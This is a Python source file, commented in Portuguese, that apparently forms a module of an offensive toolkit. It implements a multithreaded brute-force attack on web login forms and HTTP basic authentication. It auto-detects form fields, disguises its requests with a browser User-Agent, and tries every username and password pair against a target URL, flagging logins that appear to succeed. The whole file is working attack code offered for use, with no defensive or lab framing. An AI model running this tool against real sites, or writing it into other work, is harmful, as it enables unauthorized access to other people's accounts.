#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import logging
import re
import time
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

logger = logging.getLogger("nsf.bruteforce")

# User-Agent para requisições
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

def perform_bruteforce(target, mode='login', username_list=None, password_list=None, username_field='username', password_field='password'):
    """
    Realiza um ataque de força bruta em um formulário de login.
    
    Args:
        target (str): URL alvo (ex: https://exemplo.com/login.php)
        mode (str): Modo de operação ('login', 'form', 'basic_auth')
        username_list (list): Lista de nomes de usuário para testar
        password_list (list): Lista de senhas para testar
        username_field (str): Nome do campo de usuário no formulário
        password_field (str): Nome do campo de senha no formulário
    
    Returns:
        dict: Resultado do ataque com credenciais válidas encontradas
    """
    logger.info(f"Iniciando brute force em {target} (modo: {mode})")
    
    # Normalizar URL alvo
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    # Headers para requisições
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    
    # Verificar se as listas de usuários e senhas foram fornecidas
    if not username_list or not password_list:
        logger.error("Listas de usuários e senhas são obrigatórias")
        raise ValueError("Listas de usuários e senhas são obrigatórias")
    
    # Detectar campos de formulário automaticamente se necessário
    if mode == 'form':
        form_info = detect_login_form(target, headers)
        if form_info:
            target = form_info['action']
            username_field = form_info.get('username_field', username_field)
            password_field = form_info.get('password_field', password_field)
    
    # Obter resposta base para comparar depois
    baseline_response = None
    failure_markers = None
    success_markers = None
    
    try:
        if mode == 'basic_auth':
            baseline_response = requests.get(target, headers=headers, timeout=10)
        else:  # login ou form
            # Tentar fazer login com credenciais inválidas para estabelecer linha de base
            data = {
                username_field: 'invalid_user_' + str(int(time.time())),
                password_field: 'invalid_pass_' + str(int(time.time()))
            }
            
            baseline_response = requests.post(target, headers=headers, data=data, timeout=10, allow_redirects=True)
            
            # Armazenar marcadores típicos de falha
            if baseline_response.status_code == 200:
                failure_markers = detect_failure_markers(baseline_response.text)
            
            # Tentar determinar marcadores de sucesso
            # (Isto é especulativo e pode variar de site para site)
            if "dashboard" in target.lower() or "admin" in target.lower():
                success_markers = [
                    "dashboard", "admin", "profile", "welcome", "logout", "account", 
                    "painel", "bem-vindo", "sair", "conta"
                ]
    except Exception as e:
        logger.error(f"Erro ao obter resposta base: {str(e)}")
        # Continuar mesmo com erro
    
    # Resultados
    successful_attempts = []
    attempts = 0
    
    # Função para testar uma combinação de usuário e senha
    def test_credentials(username, password):
        nonlocal attempts
        attempts += 1
        
        try:
            if mode == 'basic_auth':
                # Autenticação básica HTTP
                auth = (username, password)
                response = requests.get(target, headers=headers, auth=auth, timeout=10)
                
                # Verificar se a autenticação foi bem-sucedida (não deveria retornar 401)
                if response.status_code != 401:
                    return {
                        'username': username,
                        'password': password,
                        'status_code': response.status_code,
                        'success': True
                    }
            else:  # login ou form
                # Construir dados do formulário
                data = {
                    username_field: username,
                    password_field: password
                }
                
                # Enviar requisição POST para o formulário de login
                response = requests.post(target, headers=headers, data=data, timeout=10, allow_redirects=True)
                
                # Verificar se o login foi bem-sucedido
                success = False
                
                # Métodos para verificar sucesso:
                
                # 1. Verificar redirecionamentos para páginas pós-login
                if response.history:
                    for resp in response.history:
                        location = resp.headers.get('Location', '')
                        if location and any(marker in location.lower() for marker in ['dashboard', 'admin', 'profile', 'account', 'painel']):
                            success = True
                            break
                
                # 2. Verificar cookies de sessão
                if not success and 'Set-Cookie' in response.headers:
                    cookies = response.headers.get('Set-Cookie')
                    if 'session' in cookies.lower() or 'auth' in cookies.lower() or 'logged' in cookies.lower():
                        success = True
                
                # 3. Verificar conteúdo da página
                if not success and success_markers:
                    if any(marker in response.text.lower() for marker in success_markers):
                        success = True
                
                # 4. Verificar ausência de marcadores de falha
                if not success and failure_markers:
                    if not any(marker in response.text.lower() for marker in failure_markers):
                        success = True
                
                # 5. Comparar resposta com linha de base
                if not success and baseline_response:
                    # Se o comprimento da resposta for significativamente diferente
                    if abs(len(response.text) - len(baseline_response.text)) > 20:
                        success = True
                
                if success:
                    return {
                        'username': username,
                        'password': password,
                        'status_code': response.status_code,
                        'success': True
                    }
            
            return None
        
        except requests.RequestException as e:
            logger.error(f"Erro ao testar credenciais {username}:{password}: {str(e)}")
            # Adicionar atraso em caso de erro (possível limite de taxa)
            time.sleep(2)
            return None
    
    # Realizar brute force com múltiplas threads
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        
        # Para cada combinação de usuário e senha
        for username in username_list:
            for password in password_list:
                futures.append(executor.submit(test_credentials, username, password))
        
        # Processar resultados à medida que forem concluídos
        for future in as_completed(futures):
            result = future.result()
            if result and result.get('success'):
                logger.info(f"Credenciais válidas encontradas: {result['username']}:{result['password']}")
                successful_attempts.append(result)
                
                # Opcional: interromper após encontrar a primeira credencial válida
                # break
    
    return {
        'successful_attempts': successful_attempts,
        'attempts': attempts,
        'target': target,
        'mode': mode,
        'username_field': username_field,
        'password_field': password_field
    }

def detect_login_form(url, headers):
    """
    Detecta automaticamente um formulário de login em uma página.
    
    Args:
        url (str): URL da página com o formulário
        headers (dict): Headers para requisição
    
    Returns:
        dict: Informações sobre o formulário detectado, ou None se não encontrado
    """
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code != 200:
            return None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Procurar por formulários
        forms = soup.find_all('form')
        for form in forms:
            # Verificar se é um formulário de login
            password_field = form.find('input', {'type': 'password'})
            if password_field:
                # Encontramos um campo de senha, provavelmente é um formulário de login
                action = form.get('action', '')
                method = form.get('method', 'post').lower()
                
                if method != 'post':
                    continue  # Formulários de login geralmente são POST
                
                # Se action for relativo, torná-lo absoluto
                if action:
                    action_url = urljoin(url, action)
                else:
                    action_url = url
                
                # Encontrar campo de usuário (geralmente está próximo do campo de senha)
                username_field = None
                inputs = form.find_all('input', {'type': ['text', 'email', 'tel']})
                if inputs:
                    # Geralmente o primeiro campo de texto é para o nome de usuário
                    username_field = inputs[0].get('name')
                
                # Se não encontrou um campo de texto, procurar por outros tipos
                if not username_field:
                    inputs = form.find_all('input')
                    for input_field in inputs:
                        if input_field.get('type') not in ['password', 'submit', 'button', 'hidden', 'checkbox', 'radio']:
                            username_field = input_field.get('name')
                            break
                
                # Se encontramos ambos os campos
                if username_field and password_field.get('name'):
                    return {
                        'action': action_url,
                        'method': method,
                        'username_field': username_field,
                        'password_field': password_field.get('name')
                    }
    
    except Exception as e:
        logger.error(f"Erro ao detectar formulário de login: {str(e)}")
    
    return None

def detect_failure_markers(html_content):
    """
    Detecta marcadores típicos de falha de login em uma página HTML.
    
    Args:
        html_content (str): Conteúdo HTML da página
    
    Returns:
        list: Lista de marcadores detectados
    """
    failure_patterns = [
        "invalid username", "invalid password", "incorrect credentials", 
        "login failed", "user not found", "wrong password",
        "authentication failed", "invalid login", "username or password is incorrect",
        "usuário inválido", "senha inválida", "credenciais incorretas",
        "falha no login", "usuário não encontrado", "senha incorreta",
        "autenticação falhou", "login inválido"
    ]
    
    detected_markers = []
    html_lower = html_content.lower()
    
    for pattern in failure_patterns:
        if pattern in html_lower:
            detected_markers.append(pattern)
    
    return detected_markers